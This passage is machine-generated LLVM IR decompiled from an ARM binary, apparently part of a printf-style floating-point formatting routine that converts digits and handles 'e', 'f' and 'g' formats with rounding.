  %v3_11e1c = load i32, i32* @r5, align 4
  store i32 %v3_11e1c, i32* @r7, align 4
  br label %dec_label_pc_11e4c

dec_label_pc_11e24:                               ; preds = %dec_label_pc_11e00
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_11e28 = load i32, i32* @r4, align 4
  store i32 %v0_11e28, i32* %r0.global-to-local, align 4
  %v0_11e2c = load i32, i32* @r5, align 4
  store i32 %v0_11e2c, i32* %r1.global-to-local, align 4
  store i32 1076101120, i32* %r2.global-to-local, align 4
  %v4_11e34 = call i32 @function_15898(i32 %v0_11e28, i32 %v0_11e2c, i32 1076101120, i32 0)
  store i32 %v4_11e34, i32* %r0.global-to-local, align 4
  %v1_11e3c = add i32 %stack_var_-192.5, 1
  store i32 %v1_11e3c, i32* %r3.global-to-local, align 4
  store i32 %v4_11e34, i32* @r6, align 4
  store i32 %v0_11e2c, i32* @r7, align 4
  br label %dec_label_pc_11e4c

dec_label_pc_11e4c:                               ; preds = %.thread126, %bb225, %bb226, %dec_label_pc_11e24
  %stack_var_-192.6 = phi i32 [ -1, %bb226 ], [ -1, %bb225 ], [ %v1_11e3c, %dec_label_pc_11e24 ], [ %stack_var_-192.5, %.thread126 ]
  %v2_11e4c = ptrtoint i32* %stack_var_-77 to i32
  store i32 %v2_11e4c, i32* @sb, align 4
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_11e54

dec_label_pc_11e54:                               ; preds = %dec_label_pc_11ee8, %dec_label_pc_11e4c
  %v0_11e54 = load i32, i32* @r7, align 4
  store i32 %v0_11e54, i32* %r1.global-to-local, align 4
  %v0_11e58 = load i32, i32* @r6, align 4
  store i32 %v0_11e58, i32* %r0.global-to-local, align 4
  %v2_11e5c = call i32 @function_15bc4(i32 %v0_11e58, i32 %v0_11e54)
  store i32 %v2_11e5c, i32* @r0, align 4
  store i32 %v2_11e5c, i32* @r4, align 4
  %v0_11e64 = call i32 @function_15484()
  store i32 %v0_11e64, i32* @r0, align 4
  %v0_11e68 = load i32, i32* @r4, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11e68 = icmp slt i32 %v0_11e68, 0
  store i1 %v1_11e68, i1* %cpsr_n.global-to-local, align 1
  %v2_11e68 = icmp eq i32 %v0_11e68, 0
  store i1 %v2_11e68, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_11e64, i32* %r2.global-to-local, align 4
  store i32 %v0_11e54, i32* %r3.global-to-local, align 4
  br i1 %v1_11e68, label %dec_label_pc_11e78, label %dec_label_pc_11e8c

dec_label_pc_11e78:                               ; preds = %dec_label_pc_11e54
  store i32 1106247680, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_11e80 = call i32 @function_1517c()
  store i32 %v0_11e80, i32* %r0.global-to-local, align 4
  store i32 %v0_11e80, i32* %r2.global-to-local, align 4
  store i32 %v0_11e54, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11e8c

dec_label_pc_11e8c:                               ; preds = %dec_label_pc_11e54, %dec_label_pc_11e78
  %v0_11e8c = load i32, i32* @r6, align 4
  store i32 %v0_11e8c, i32* @r0, align 4
  %v0_11e90 = load i32, i32* @r7, align 4
  store i32 %v0_11e90, i32* %r1.global-to-local, align 4
  %v2_11e94 = call i32 @function_15178(i32 %v0_11e8c, i32 %v0_11e90)
  store i32 %v2_11e94, i32* %r0.global-to-local, align 4
  store i32 1104006501, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_11ea0 = call i32 @function_15570(i32 %v2_11e94, i32 %v0_11e90, i32 1104006501, i32 0)
  store i32 %v4_11ea0, i32* %r0.global-to-local, align 4
  %v0_11ea4 = load i32, i32* @sb, align 4
  %v1_11ea4 = add i32 %v0_11ea4, 9
  store i32 %v1_11ea4, i32* @sb, align 4
  store i32 %v4_11ea0, i32* @r6, align 4
  store i32 %v0_11e90, i32* @r7, align 4
  store i32 0, i32* @r5, align 4
  %v0_11eb4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11eb4

dec_label_pc_11eb4:                               ; preds = %dec_label_pc_11eb4, %dec_label_pc_11e8c
  %v0_11eb4 = phi i32 [ %v0_11ed8, %dec_label_pc_11eb4 ], [ %v0_11eb4.pre, %dec_label_pc_11e8c ]
  store i32 %v0_11eb4, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_11ebc = call i32 @function_ca30(i32 %v0_11eb4, i32 10)
  %v0_11ec0 = load i32, i32* @r5, align 4
  %v1_11ec0 = add i32 %v0_11ec0, 1
  store i32 %v1_11ec0, i32* @r5, align 4
  %v1_11ec4 = add i32 %v2_11ebc, 48
  store i32 %v1_11ec4, i32* %r2.global-to-local, align 4
  %v1_11ec8 = load i32, i32* @sb, align 4
  %v2_11ec8 = sub i32 %v1_11ec8, %v1_11ec0
  store i32 %v2_11ec8, i32* %r3.global-to-local, align 4
  %v0_11ecc = load i32, i32* @r4, align 4
  store i32 %v0_11ecc, i32* @r0, align 4
  store i32 10, i32* @r1, align 4
  %v1_11ed4 = trunc i32 %v1_11ec4 to i8
  %v3_11ed4 = inttoptr i32 %v2_11ec8 to i8*
  store i8 %v1_11ed4, i8* %v3_11ed4, align 1
  %v0_11ed8 = call i32 @function_14f20()
  store i32 %v0_11ed8, i32* %r0.global-to-local, align 4
  %v0_11edc = load i32, i32* @r5, align 4
  %v1_11edc = add i32 %v0_11edc, -8
  %v3_11edc = sub i32 7, %v0_11edc
  %v4_11edc = and i32 %v3_11edc, %v0_11edc
  %v5_11edc = icmp slt i32 %v4_11edc, 0
  store i1 %v5_11edc, i1* %cpsr_v.global-to-local, align 1
  %v6_11edc = icmp slt i32 %v1_11edc, 0
  store i1 %v6_11edc, i1* %cpsr_n.global-to-local, align 1
  %v7_11edc = icmp eq i32 %v0_11edc, 8
  store i1 %v7_11edc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_11ed8, i32* @r4, align 4
  %v7_11ee4 = icmp slt i32 %v0_11edc, 9
  br i1 %v7_11ee4, label %dec_label_pc_11eb4, label %dec_label_pc_11ee8

dec_label_pc_11ee8:                               ; preds = %dec_label_pc_11eb4
  %v0_11ee8 = load i32, i32* @r8, align 4
  %v1_11ee8 = add i32 %v0_11ee8, 1
  store i32 %v1_11ee8, i32* @r8, align 4
  %v3_11eec = sub i32 -1, %v0_11ee8
  %v4_11eec = and i32 %v1_11ee8, %v3_11eec
  %v5_11eec = icmp slt i32 %v4_11eec, 0
  store i1 %v5_11eec, i1* %cpsr_v.global-to-local, align 1
  %v6_11eec = icmp slt i32 %v0_11ee8, 0
  store i1 %v6_11eec, i1* %cpsr_n.global-to-local, align 1
  %v7_11eec = icmp eq i32 %v0_11ee8, 0
  store i1 %v7_11eec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11eec, label %dec_label_pc_11e54, label %dec_label_pc_11ef4

dec_label_pc_11ef4:                               ; preds = %dec_label_pc_11ee8
  %v0_11ef4 = load i32, i32* @sl, align 4
  %v1_11ef4 = add i32 %v0_11ef4, -96
  %v3_11ef4 = sub i32 95, %v0_11ef4
  %v4_11ef4 = and i32 %v3_11ef4, %v0_11ef4
  %v5_11ef4 = icmp slt i32 %v4_11ef4, 0
  store i1 %v5_11ef4, i1* %cpsr_v.global-to-local, align 1
  %v6_11ef4 = icmp slt i32 %v1_11ef4, 0
  store i1 %v6_11ef4, i1* %cpsr_n.global-to-local, align 1
  %v7_11ef4 = icmp eq i32 %v0_11ef4, 96
  store i1 %v7_11ef4, i1* %cpsr_z.global-to-local, align 1
  %tmp288 = icmp ult i32 %v0_11ef4, 97
  store i32 %v1_11f24, i32* %ip.global-to-local, align 4
  br i1 %tmp288, label %bb230, label %thread-pre-split

bb230:                                            ; preds = %dec_label_pc_11ef4
  %v5_11f04 = add i32 %v0_11ef4, 32
  store i32 %v5_11f04, i32* %r3.global-to-local, align 4
  %v5_11f08 = urem i32 %v5_11f04, 256
  store i32 %v5_11f08, i32* @sl, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_11ef4, %bb230
  %v0_11f2c = phi i32 [ %v5_11f08, %bb230 ], [ %v0_11ef4, %dec_label_pc_11ef4 ]
  %stack_var_-58.0130137 = phi i32 [ 69, %bb230 ], [ 101, %dec_label_pc_11ef4 ]
  %v7_11f0c = icmp eq i32 %v0_11f2c, 103
  %. = zext i1 %v7_11f0c to i32
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11f18 = icmp slt i32 %v1_11f24, 0
  store i1 %v1_11f18, i1* %cpsr_n.global-to-local, align 1
  %v2_11f18 = icmp eq i32 %v1_11f24, 0
  store i1 %v2_11f18, i1* %cpsr_z.global-to-local, align 1
  %tmp233 = icmp slt i32 %v1_11f24, 1
  br i1 %tmp233, label %.thread12, label %bb234

.thread12:                                        ; preds = %thread-pre-split
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb236

bb234:                                            ; preds = %thread-pre-split
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_11f20 = icmp eq i1 %v7_11f0c, false
  store i1 %v2_11f20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11f20, label %bb236, label %bb235

bb235:                                            ; preds = %bb234
  %v2_11f24 = add i32 %v1_11f24, -1
  store i32 %v2_11f24, i32* %ip.global-to-local, align 4
  br label %bb236

bb236:                                            ; preds = %.thread12, %bb234, %bb235
  %v0_11f28 = phi i32 [ %v1_11f24, %.thread12 ], [ %v1_11f24, %bb234 ], [ %v2_11f24, %bb235 ]
  %v1_11f2c = add i32 %v0_11f2c, -102
  %v3_11f2c = sub i32 101, %v0_11f2c
  %v4_11f2c = and i32 %v3_11f2c, %v0_11f2c
  %v5_11f2c = icmp slt i32 %v4_11f2c, 0
  store i1 %v5_11f2c, i1* %cpsr_v.global-to-local, align 1
  %v6_11f2c = icmp slt i32 %v1_11f2c, 0
  store i1 %v6_11f2c, i1* %cpsr_n.global-to-local, align 1
  %v7_11f2c = icmp eq i32 %v0_11f2c, 102
  store i1 %v7_11f2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11f2c, label %dec_label_pc_11f38, label %bb237

bb237:                                            ; preds = %bb236
  store i32 %v0_11f28, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11f64

dec_label_pc_11f38:                               ; preds = %bb236
  store i32 %v0_11f28, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-192.6, i32* %r1.global-to-local, align 4
  %v2_11f40 = add i32 %v0_11f28, %stack_var_-192.6
  store i32 %v2_11f40, i32* %ip.global-to-local, align 4
  %v1_11f44 = add i32 %v2_11f40, 1
  %v3_11f44 = sub i32 0, %v2_11f40
  %v4_11f44 = and i32 %v1_11f44, %v3_11f44
  %v5_11f44 = icmp slt i32 %v4_11f44, 0
  store i1 %v5_11f44, i1* %cpsr_v.global-to-local, align 1
  %v6_11f44 = icmp slt i32 %v1_11f44, 0
  store i1 %v6_11f44, i1* %cpsr_n.global-to-local, align 1
  %v7_11f44 = icmp eq i32 %v1_11f44, 0
  store i1 %v7_11f44, i1* %cpsr_z.global-to-local, align 1
  %v2_11f48 = xor i1 %v6_11f44, %v5_11f44
  br i1 %v2_11f48, label %dec_label_pc_11f4c, label %dec_label_pc_11f64

dec_label_pc_11f4c:                               ; preds = %dec_label_pc_11f38
  %v2_11f4c = ptrtoint i32* %stack_var_-79 to i32
  store i32 %v2_11f4c, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v2_11f58 = bitcast i32* %stack_var_-79 to i8*
  %v3_11f58 = call i32 @function_ef70(i8* %v2_11f58, i32 48)
  store i32 %v3_11f58, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11f64

dec_label_pc_11f64:                               ; preds = %bb237, %dec_label_pc_11f38, %dec_label_pc_11f4c
  %v1_11fa874 = phi i32 [ %v3_11f58, %dec_label_pc_11f4c ], [ %v0_11f28, %dec_label_pc_11f38 ], [ %v0_11ed8, %bb237 ]
  %v1_11f8c = phi i32 [ -1, %dec_label_pc_11f4c ], [ %v2_11f40, %dec_label_pc_11f38 ], [ %v0_11f28, %bb237 ]
  %stack_var_-192.7 = phi i32 [ -1, %dec_label_pc_11f4c ], [ %stack_var_-192.6, %dec_label_pc_11f38 ], [ %stack_var_-192.6, %bb237 ]
  %v1_11f68 = add i32 %v1_11f8c, -16
  %v3_11f68 = sub i32 15, %v1_11f8c
  %v4_11f68 = and i32 %v3_11f68, %v1_11f8c
  %v5_11f68 = icmp slt i32 %v4_11f68, 0
  store i1 %v5_11f68, i1* %cpsr_v.global-to-local, align 1
  %v6_11f68 = icmp slt i32 %v1_11f68, 0
  store i1 %v6_11f68, i1* %cpsr_n.global-to-local, align 1
  %v7_11f68 = icmp eq i32 %v1_11f8c, 16
  store i1 %v7_11f68, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-78, align 4
  %v2_11f74 = ptrtoint i32* %stack_var_-79 to i32
  store i32 %v2_11f74, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-79, align 4
  %v3_11f7c = xor i1 %v6_11f68, %v5_11f68
  %v4_11f7c = or i1 %v7_11f68, %v3_11f7c
  br i1 %v4_11f7c, label %dec_label_pc_11f88, label %..preheader_crit_edge

..preheader_crit_edge:                            ; preds = %dec_label_pc_11f64
  store i32 0, i32* %r0.global-to-local, align 4
  %v7_11f80151 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v7_11f80151, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_11f88:                               ; preds = %dec_label_pc_11f64
  %v2_11f88 = ptrtoint i32* %stack_var_-78 to i32
  %v2_11f8c = add i32 %v1_11f8c, %v2_11f88
  store i32 %v2_11f8c, i32* %r3.global-to-local, align 4
  %v1_11f90 = add i32 %v2_11f8c, 2
  %v2_11f90 = inttoptr i32 %v1_11f90 to i8*
  %v3_11f90 = load i8, i8* %v2_11f90, align 1
  %v4_11f90 = zext i8 %v3_11f90 to i32
  store i32 %v4_11f90, i32* %r2.global-to-local, align 4
  store i32 %v1_11f90, i32* %r1.global-to-local, align 4
  %v2_11f98 = icmp ugt i8 %v3_11f90, 51
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_11f98 = icmp ult i8 %v3_11f90, 52
  store i1 %v6_11f98, i1* %cpsr_n.global-to-local, align 1
  %v7_11f98 = icmp eq i8 %v3_11f90, 52
  store i1 %v7_11f98, i1* %cpsr_z.global-to-local, align 1
  %v2_11f9c = xor i1 %v2_11f98, true
  %v3_11f9c = or i1 %v7_11f98, %v2_11f9c
  br i1 %v3_11f9c, label %bb238, label %bb239

bb238:                                            ; preds = %dec_label_pc_11f88
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb239

bb239:                                            ; preds = %dec_label_pc_11f88, %bb238
  %v1_11fa872 = phi i32 [ %v1_11fa874, %dec_label_pc_11f88 ], [ 0, %bb238 ]
  %v2_11fa0 = xor i1 %v7_11f98, true
  %v3_11fa0 = and i1 %v2_11f98, %v2_11fa0
  br i1 %v3_11fa0, label %bb240, label %.preheader

bb240:                                            ; preds = %bb239
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb239, %bb240, %..preheader_crit_edge, %.backedge
  %v1_11fa8 = phi i32 [ %v1_11fa8.pre, %.backedge ], [ 0, %..preheader_crit_edge ], [ %v1_11fa872, %bb239 ], [ 1, %bb240 ]
  %v0_11fa4 = phi i32 [ %v0_11fb0, %.backedge ], [ %v7_11f80151, %..preheader_crit_edge ], [ %v1_11f90, %bb239 ], [ %v1_11f90, %bb240 ]
  %v1_11fa4 = add i32 %v0_11fa4, -1
  %v2_11fa4 = inttoptr i32 %v1_11fa4 to i8*
  %v3_11fa4 = load i8, i8* %v2_11fa4, align 1
  %v4_11fa4 = zext i8 %v3_11fa4 to i32
  store i32 %v1_11fa4, i32* %r1.global-to-local, align 4
  %v2_11fa8 = add i32 %v4_11fa4, %v1_11fa8
  store i32 %v2_11fa8, i32* %r3.global-to-local, align 4
  %v1_11fac = trunc i32 %v2_11fa8 to i8
  store i8 %v1_11fac, i8* %v2_11fa4, align 1
  %v0_11fb0 = load i32, i32* %r1.global-to-local, align 4
  %v1_11fb0 = inttoptr i32 %v0_11fb0 to i8*
  %v2_11fb0 = load i8, i8* %v1_11fb0, align 1
  %v3_11fb0 = zext i8 %v2_11fb0 to i32
  store i32 %v3_11fb0, i32* %r2.global-to-local, align 4
  %v2_11fb4 = icmp ugt i8 %v2_11fb0, 56
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_11fb4 = icmp ult i8 %v2_11fb0, 57
  store i1 %v6_11fb4, i1* %cpsr_n.global-to-local, align 1
  %v7_11fb4 = icmp eq i8 %v2_11fb0, 57
  store i1 %v7_11fb4, i1* %cpsr_z.global-to-local, align 1
  %v2_11fb8 = xor i1 %v2_11fb4, true
  %v3_11fb8 = or i1 %v7_11fb4, %v2_11fb8
  br i1 %v3_11fb8, label %bb241, label %bb242

bb241:                                            ; preds = %.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb242

bb242:                                            ; preds = %.preheader, %bb241
  %v2_11fbc = xor i1 %v7_11fb4, true
  %v3_11fbc = and i1 %v2_11fb4, %v2_11fbc
  br i1 %v3_11fbc, label %bb243, label %._crit_edge75

._crit_edge75:                                    ; preds = %bb242
  %v1_11fc4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb244

bb243:                                            ; preds = %bb242
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb244

bb244:                                            ; preds = %._crit_edge75, %bb243
  %v1_11fc4 = phi i32 [ %v1_11fc4.pre, %._crit_edge75 ], [ 1, %bb243 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_11fc0 = icmp ult i8 %v2_11fb0, 48
  store i1 %v6_11fc0, i1* %cpsr_n.global-to-local, align 1
  %v7_11fc0 = icmp eq i8 %v2_11fb0, 48
  store i1 %v7_11fc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11fc0, label %.thread17, label %bb245

.thread17:                                        ; preds = %bb244
  %v2_11fc4 = or i32 %v1_11fc4, 1
  store i32 %v2_11fc4, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11fc818 = icmp slt i32 %v2_11fc4, 0
  store i1 %v1_11fc818, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %.backedge

bb245:                                            ; preds = %bb244
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11fc8 = icmp slt i32 %v1_11fc4, 0
  store i1 %v1_11fc8, i1* %cpsr_n.global-to-local, align 1
  %v2_11fc8 = icmp eq i32 %v1_11fc4, 0
  store i1 %v2_11fc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11fc8, label %dec_label_pc_11fd0, label %.backedge

.backedge:                                        ; preds = %bb245, %.thread17
  %v1_11fa8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_11fd0:                               ; preds = %bb245
  store i32 %v2_11f74, i32* %r2.global-to-local, align 4
  %v2_11fd4 = ptrtoint i32* %stack_var_-78 to i32
  store i32 %v2_11fd4, i32* %r3.global-to-local, align 4
  %v2_11fd8 = sub i32 %v0_11fb0, %v2_11fd4
  %v3_11fd8 = icmp uge i32 %v0_11fb0, %v2_11fd4
  %v4_11fd8 = xor i32 %v0_11fb0, %v2_11fd4
  %v5_11fd8 = xor i32 %v2_11fd8, %v0_11fb0
  %v6_11fd8 = and i32 %v5_11fd8, %v4_11fd8
  %v7_11fd8 = icmp slt i32 %v6_11fd8, 0
  store i1 %v7_11fd8, i1* %cpsr_v.global-to-local, align 1
  %v8_11fd8 = icmp slt i32 %v2_11fd8, 0
  store i1 %v8_11fd8, i1* %cpsr_n.global-to-local, align 1
  %v9_11fd8 = icmp eq i32 %v0_11fb0, %v2_11fd4
  store i1 %v9_11fd8, i1* %cpsr_z.global-to-local, align 1
  %v2_11fdc = xor i1 %v3_11fd8, true
  %v3_11fdc = or i1 %v9_11fd8, %v2_11fdc
  br i1 %v3_11fdc, label %bb246, label %.thread161

bb246:                                            ; preds = %dec_label_pc_11fd0
  store i32 %v2_11fd4, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-192.7, i32* %r3.global-to-local, align 4
  store i32 %v2_11fd4, i32* %r1.global-to-local, align 4
  br label %.thread161

.thread161:                                       ; preds = %dec_label_pc_11fd0, %bb246
  %v4_11fec159 = phi i32 [ %stack_var_-192.7, %bb246 ], [ %v2_11fd4, %dec_label_pc_11fd0 ]
  %v2_11ffc = phi i32 [ %v2_11fd4, %bb246 ], [ %v0_11fb0, %dec_label_pc_11fd0 ]
  %v4_11ff0153158 = phi i32 [ %v2_11fd4, %bb246 ], [ %v2_11f74, %dec_label_pc_11fd0 ]
  %v2_11fe8 = xor i1 %v9_11fd8, true
  %v3_11fe8 = and i1 %v3_11fd8, %v2_11fe8
  br i1 %v3_11fe8, label %bb247, label %bb248

bb247:                                            ; preds = %.thread161
  store i32 %stack_var_-192.7, i32* %r0.global-to-local, align 4
  br label %bb248

bb248:                                            ; preds = %.thread161, %bb247
  br i1 %v3_11fdc, label %bb249, label %bb250

bb249:                                            ; preds = %bb248
  %v5_11fec = add i32 %v4_11fec159, 1
  store i32 %v5_11fec, i32* %r0.global-to-local, align 4
  br label %bb250

bb250:                                            ; preds = %bb248, %bb249
  br i1 %v3_11fe8, label %bb251, label %bb252

bb251:                                            ; preds = %bb250
  %v5_11ff0 = add i32 %v4_11ff0153158, 2
  store i32 %v5_11ff0, i32* %r2.global-to-local, align 4
  br label %bb252

bb252:                                            ; preds = %bb250, %bb251
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_11ff8 = load i32, i32* @sl, align 4
  %v1_11ff8 = add i32 %v0_11ff8, -103
  %v3_11ff8 = sub i32 102, %v0_11ff8
  %v4_11ff8 = and i32 %v3_11ff8, %v0_11ff8
  %v5_11ff8 = icmp slt i32 %v4_11ff8, 0
  store i1 %v5_11ff8, i1* %cpsr_v.global-to-local, align 1
  %v6_11ff8 = icmp slt i32 %v1_11ff8, 0
  store i1 %v6_11ff8, i1* %cpsr_n.global-to-local, align 1
  %v7_11ff8 = icmp eq i32 %v0_11ff8, 103
  store i1 %v7_11ff8, i1* %cpsr_z.global-to-local, align 1
  %v3_11ffc = add i32 %v2_11ffc, 1
  %v4_11ffc = inttoptr i32 %v3_11ffc to i8*
  store i8 0, i8* %v4_11ffc, align 1
  %v0_12000 = load i32, i32* %r1.global-to-local, align 4
  %v1_12000 = add i32 %v0_12000, 1
  store i32 %v1_12000, i32* %r1.global-to-local, align 4
  %v0_12004 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12004, label %dec_label_pc_12008, label %dec_label_pc_12038

dec_label_pc_12008:                               ; preds = %bb252
  %v0_12008 = load i32, i32* %r0.global-to-local, align 4
  %v1_12008 = load i32, i32* %ip.global-to-local, align 4
  %v2_12008 = sub i32 %v0_12008, %v1_12008
  %v4_12008 = xor i32 %v1_12008, %v0_12008
  %v5_12008 = xor i32 %v2_12008, %v0_12008
  %v6_12008 = and i32 %v5_12008, %v4_12008
  %v7_12008 = icmp slt i32 %v6_12008, 0
  %v8_12008 = icmp slt i32 %v2_12008, 0
  %v9_12008 = icmp eq i32 %v0_12008, %v1_12008
  %v3_1200c = xor i1 %v8_12008, %v7_12008
  %v4_1200c = or i1 %v9_12008, %v3_1200c
  %.274 = zext i1 %v4_1200c to i32
  store i32 %.274, i32* %r3.global-to-local, align 4
  %v1_12014 = add i32 %v0_12008, 4
  %v3_12014 = sub i32 0, %v0_12008
  %v4_12014 = and i32 %v1_12014, %v3_12014
  %v5_12014 = icmp slt i32 %v4_12014, 0
  store i1 %v5_12014, i1* %cpsr_v.global-to-local, align 1
  %v6_12014 = icmp slt i32 %v1_12014, 0
  store i1 %v6_12014, i1* %cpsr_n.global-to-local, align 1
  %v7_12014 = icmp eq i32 %v1_12014, 0
  store i1 %v7_12014, i1* %cpsr_z.global-to-local, align 1
  %v2_12018 = xor i1 %v6_12014, %v5_12014
  br i1 %v2_12018, label %.thread21, label %bb255

.thread21:                                        ; preds = %dec_label_pc_12008
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread164

bb255:                                            ; preds = %dec_label_pc_12008
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1201c = icmp eq i1 %v4_1200c, false
  store i1 %v2_1201c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1201c, label %.thread164, label %bb256

.thread164:                                       ; preds = %bb255, %.thread21
  %v1_120243551 = load i32, i32* @sl, align 4
  store i32 %v1_120243551, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_12044

bb256:                                            ; preds = %bb255
  %v3_12020 = sub i32 %v1_12008, %v0_12008
  store i32 %v3_12020, i32* %ip.global-to-local, align 4
  store i32 102, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_12050

dec_label_pc_12038:                               ; preds = %bb252
  %v0_12038 = load i32, i32* @sl, align 4
  %v1_12038 = add i32 %v0_12038, -102
  %v3_12038 = sub i32 101, %v0_12038
  %v4_12038 = and i32 %v3_12038, %v0_12038
  %v5_12038 = icmp slt i32 %v4_12038, 0
  store i1 %v5_12038, i1* %cpsr_v.global-to-local, align 1
  %v6_12038 = icmp slt i32 %v1_12038, 0
  store i1 %v6_12038, i1* %cpsr_n.global-to-local, align 1
  %v7_12038 = icmp eq i32 %v0_12038, 102
  store i1 %v7_12038, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_12038, i32* %r7.global-to-local, align 4
  br i1 %v7_12038, label %dec_label_pc_12038.dec_label_pc_12050_crit_edge, label %dec_label_pc_12044

dec_label_pc_12038.dec_label_pc_12050_crit_edge:  ; preds = %dec_label_pc_12038
  %v0_12050.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12050

dec_label_pc_12044:                               ; preds = %.thread164, %dec_label_pc_12038
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12060

dec_label_pc_12050:                               ; preds = %bb256, %dec_label_pc_12038.dec_label_pc_12050_crit_edge
  %v0_12050 = phi i32 [ %v0_12008, %bb256 ], [ %v0_12050.pre, %dec_label_pc_12038.dec_label_pc_12050_crit_edge ]
  %stack_var_-184.3 = phi i32 [ %v3_12020, %bb256 ], [ %v0_11f28, %dec_label_pc_12038.dec_label_pc_12050_crit_edge ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_12050 = icmp slt i32 %v0_12050, 0
  store i1 %v1_12050, i1* %cpsr_n.global-to-local, align 1
  %v2_12050 = icmp eq i32 %v0_12050, 0
  store i1 %v2_12050, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_12050, label %bb257, label %bb258

bb257:                                            ; preds = %dec_label_pc_12050
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_12058 = load i32, i32* %r2.global-to-local, align 4
  %v6_12058 = add i32 %v5_12058, -1
  %v7_12058 = inttoptr i32 %v6_12058 to i8*
  store i8 48, i8* %v7_12058, align 1
  %v8_12058 = load i32, i32* %r2.global-to-local, align 4
  %v9_12058 = add i32 %v8_12058, -1
  store i32 %v9_12058, i32* %r2.global-to-local, align 4
  %v0_1205c.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_1208c.pre.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_12090.pre.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_12090.pre.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb258

bb258:                                            ; preds = %dec_label_pc_12050, %bb257
  %v1_12090.pre = phi i1 [ %v1_12090.pre.pre, %bb257 ], [ false, %dec_label_pc_12050 ]
  %v0_12090.pre = phi i1 [ %v0_12090.pre.pre, %bb257 ], [ false, %dec_label_pc_12050 ]
  %v1_1208c.pre = phi i32 [ %v1_1208c.pre.pre, %bb257 ], [ %v1_12000, %dec_label_pc_12050 ]
  %v0_1205c = phi i32 [ %v0_1205c.pre, %bb257 ], [ %v0_12050, %dec_label_pc_12050 ]
  store i32 %v0_1205c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12060

dec_label_pc_12060:                               ; preds = %dec_label_pc_12044, %bb258
  %v0_120f8 = phi i32 [ 0, %dec_label_pc_12044 ], [ %v0_1205c, %bb258 ]
  %v1_12094 = phi i1 [ false, %dec_label_pc_12044 ], [ %v1_12090.pre, %bb258 ]
  %v0_12094 = phi i1 [ false, %dec_label_pc_12044 ], [ %v0_12090.pre, %bb258 ]
  %v1_1208c = phi i32 [ %v1_12000, %dec_label_pc_12044 ], [ %v1_1208c.pre, %bb258 ]
  %v1_121b4 = phi i32 [ %v0_11f28, %dec_label_pc_12044 ], [ %stack_var_-184.3, %bb258 ]
